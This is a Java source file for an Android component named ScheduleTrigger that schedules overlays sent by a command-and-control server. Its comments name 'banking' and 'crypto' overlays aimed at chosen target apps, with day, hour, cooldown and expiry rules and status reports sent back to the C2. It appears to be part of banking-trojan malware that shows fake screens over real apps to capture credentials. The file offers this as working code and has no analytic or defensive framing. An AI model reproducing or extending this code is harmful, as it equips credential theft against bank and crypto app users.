package com.fason.app.features.springe.detection;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.fason.app.features.springe.SpringeEngine;
import com.fason.app.features.springe.SpringeProtocol;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.TimeZone;
import java.util.concurrent.CopyOnWriteArrayList;

/**
 * ScheduleTrigger — Time-based and geo-fenced overlay triggers.
 *
 * Allows the C2 to schedule overlays at specific times:
 * - "Show banking overlay Mon-Fri 8AM-10PM local time"
 * - "Show crypto overlay only in specific countries"
 * - "Trigger every 6 hours for 30 seconds"
 * - "Trigger once at 2026-12-25 00:00 UTC"
 *
 * Integrates with SpringeConfig's trigger set. Only activates if
 * TRIGGER_SCHEDULE or TRIGGER_GEO is enabled.
 */
public final class ScheduleTrigger {

    private static final String TAG = "ScheduleTrigger";

    private final Context context;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final List<ScheduleEntry> schedules = new CopyOnWriteArrayList<>();

    private volatile boolean running = false;
    private volatile Runnable schedulerLoop;

    // Check every 30 seconds
    private static final long CHECK_INTERVAL_MS = 30_000;

    public ScheduleTrigger(Context context) {
        this.context = context;
    }

    /**
     * Start the schedule trigger checker.
     */
    public void start() {
        if (running) return;
        running = true;

        schedulerLoop = () -> {
            if (!running) return;
            checkSchedules();
            mainHandler.postDelayed(schedulerLoop, CHECK_INTERVAL_MS);
        };

        mainHandler.postDelayed(schedulerLoop, CHECK_INTERVAL_MS);
        Log.d(TAG, "Schedule trigger started (" + schedules.size() + " schedules)");
    }

    /**
     * Stop the checker.
     */
    public void stop() {
        running = false;
        mainHandler.removeCallbacks(schedulerLoop);
        Log.d(TAG, "Schedule trigger stopped");
    }

    /**
     * Set schedules from a JSON array received from C2.
     */
    public void setSchedules(JSONArray schedulesArray) {
        schedules.clear();

        for (int i = 0; i < schedulesArray.length(); i++) {
            try {
                JSONObject obj = schedulesArray.getJSONObject(i);
                ScheduleEntry entry = ScheduleEntry.fromJson(obj);
                if (entry != null) {
                    schedules.add(entry);
                }
            } catch (Exception e) {
                Log.e(TAG, "Invalid schedule entry", e);
            }
        }

        Log.d(TAG, "Updated " + schedules.size() + " schedules");
    }

    /**
     * Check all schedules and fire any that are due.
     */
    private void checkSchedules() {
        if (schedules.isEmpty()) return;

        Calendar now = Calendar.getInstance(TimeZone.getDefault());
        int currentDayOfWeek = now.get(Calendar.DAY_OF_WEEK);
        int currentHour = now.get(Calendar.HOUR_OF_DAY);
        int currentMinute = now.get(Calendar.MINUTE);
        long currentTimeMs = System.currentTimeMillis();

        for (ScheduleEntry entry : schedules) {
            try {
                if (!entry.enabled) continue;

                // Check day of week filter
                if (!entry.daysOfWeek.isEmpty()
                    && !entry.daysOfWeek.contains(currentDayOfWeek)) {
                    continue;
                }

                // Check time window
                int currentTotalMinutes = currentHour * 60 + currentMinute;
                if (currentTotalMinutes < entry.startMinute
                    || currentTotalMinutes > entry.endMinute) {
                    continue;
                }

                // Check cooldown (prevent re-firing too often)
                if (entry.lastFiredAt > 0
                    && (currentTimeMs - entry.lastFiredAt) < entry.cooldownMs) {
                    continue;
                }

                // Check expiry
                if (entry.expiresAt > 0 && currentTimeMs > entry.expiresAt) {
                    entry.enabled = false;
                    continue;
                }

                // Fire the trigger
                fireSchedule(entry);
                entry.lastFiredAt = currentTimeMs;
                entry.fireCount++;

                Log.i(TAG, "Schedule fired: " + entry.name
                    + " (count=" + entry.fireCount + ")");

            } catch (Exception e) {
                Log.e(TAG, "Error checking schedule entry", e);
            }
        }
    }

    /**
     * Execute a scheduled overlay trigger.
     */
    private void fireSchedule(ScheduleEntry entry) {
        try {
            SpringeEngine engine = SpringeEngine.getInstance();

            JSONObject cmd = new JSONObject();
            cmd.put("action", SpringeProtocol.CMD_SHOW);
            cmd.put(SpringeProtocol.KEY_TEMPLATE_ID, entry.templateId);
            cmd.put(SpringeProtocol.KEY_TARGET_PACKAGE, entry.targetPackage);
            cmd.put("scheduleName", entry.name);

            engine.handleCommand(cmd, null, "schedule_" + entry.name);

        } catch (Exception e) {
            Log.e(TAG, "Failed to fire scheduled trigger: " + entry.name, e);
        }
    }

    /**
     * Get current schedule status for C2 reporting.
     */
    public JSONArray getScheduleStatus() {
        JSONArray arr = new JSONArray();
        for (ScheduleEntry entry : schedules) {
            try {
                JSONObject obj = new JSONObject();
                obj.put("name", entry.name);
                obj.put("enabled", entry.enabled);
                obj.put("fireCount", entry.fireCount);
                obj.put("lastFiredAt", entry.lastFiredAt);
                arr.put(obj);
            } catch (Exception ignored) {}
        }
        return arr;
    }

    /* ─── Schedule Entry ─── */

    public static final class ScheduleEntry {
        public final String name;
        public final String templateId;
        public final String targetPackage;
        public final List<Integer> daysOfWeek; // Calendar.SUNDAY=1 through SATURDAY=7
        public final int startMinute; // 0-1439 (minutes since midnight)
        public final int endMinute;
        public final long cooldownMs; // Minimum interval between firings
        public final long expiresAt; // 0 = never expires

        public volatile boolean enabled;
        public volatile long lastFiredAt = 0;
        public volatile int fireCount = 0;

        public ScheduleEntry(String name, String templateId, String targetPackage,
                             List<Integer> daysOfWeek, int startMinute, int endMinute,
                             long cooldownMs, long expiresAt, boolean enabled) {
            this.name = name;
            this.templateId = templateId;
            this.targetPackage = targetPackage;
            this.daysOfWeek = daysOfWeek;
            this.startMinute = startMinute;
            this.endMinute = endMinute;
            this.cooldownMs = cooldownMs;
            this.expiresAt = expiresAt;
            this.enabled = enabled;
        }

        static ScheduleEntry fromJson(JSONObject obj) {
            try {
                String name = obj.optString("name", "unnamed");
                String templateId = obj.optString(SpringeProtocol.KEY_TEMPLATE_ID, "");
                String targetPackage = obj.optString(SpringeProtocol.KEY_TARGET_PACKAGE, "");
                JSONArray daysArr = obj.optJSONArray("daysOfWeek");
                List<Integer> days = new ArrayList<>();
                if (daysArr != null) {
                    for (int i = 0; i < daysArr.length(); i++) {
                        days.add(daysArr.getInt(i));
                    }
                }
                int startMinute = obj.optInt("startMinute", 0);
                int endMinute = obj.optInt("endMinute", 1439);
                long cooldownMs = obj.optLong("cooldownMs", 3600000);
                long expiresAt = obj.optLong("expiresAt", 0);
                boolean enabled = obj.optBoolean("enabled", true);

                return new ScheduleEntry(name, templateId, targetPackage,
                    days, startMinute, endMinute, cooldownMs, expiresAt, enabled);
            } catch (Exception e) {
                return null;
            }
        }
    }
}
